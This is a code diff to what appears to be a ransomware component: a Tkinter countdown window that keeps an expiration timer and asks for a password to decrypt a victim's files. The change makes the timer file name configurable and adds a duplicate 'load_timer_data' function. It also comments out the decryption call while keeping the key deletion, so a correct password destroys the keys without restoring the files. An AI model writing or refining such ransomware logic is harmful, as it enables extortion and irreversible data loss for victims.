@@ -6,7 +6,19 @@ import tkinter as tk
 import multiprocessing
 from datetime import datetime, timedelta
 from Decrypt import decrypt_all_files
-from Variables import script_files, seconds_left, password
+from Variables import script_files, seconds_left, password, timer_file_name
+
+####################################################################################################################
+
+def load_timer_data():
+    if not os.path.exists(timer_file_name):
+        return None
+    with open(timer_file_name, "r") as file:
+        try:
+            data = json.load(file)
+            return data
+        except json.JSONDecodeError:
+            return None
 
 ####################################################################################################################
 
@@ -15,7 +27,7 @@ stop_flag = multiprocessing.Event()
 
 def save_timer_data(start_time, expiration_time):
     try:
-        with open("timer.json", "w") as f:
+        with open(f"{timer_file_name}", "w") as f:
             json.dump({
                 "start_time": start_time.isoformat(),
                 "expiration_time": expiration_time.isoformat()
@@ -25,8 +37,8 @@ def save_timer_data(start_time, expiration_time):
         print(f"Error saving timer data: {e}")  # Debug Message
 
 def load_timer_data():
-    if os.path.exists("timer.json"):
-        with open("timer.json", "r") as f:
+    if os.path.exists(f"{timer_file_name}"):
+        with open(f"{timer_file_name}", "r") as f:
             return json.load(f)
     return None
 
@@ -58,7 +70,7 @@ def timer_window():
 
         if entered_password == password:
             result_label.config(text="Password correct. Decrypting...")
-            decrypt_all_files()
+            # decrypt_all_files()
             delete_keys()
             stop_flag.set()
             root.quit()
